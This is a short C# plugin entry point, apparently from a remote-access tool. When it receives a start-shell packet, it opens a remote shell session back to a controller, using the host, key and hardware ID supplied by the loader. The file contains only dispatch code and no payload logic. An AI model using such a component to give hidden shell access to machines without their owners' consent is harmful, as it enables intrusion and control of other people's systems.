using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;

        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.SHELL_START:
                    clientHandler = new ClientHandler(loadingAPI.host, loadingAPI.key, loadingAPI.baseIp, loadingAPI.HWID, ((StartShellSessionPacket)loadingAPI.currentPacket).isPWS);
                    clientHandler.ConnectStart();
                    break;
                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
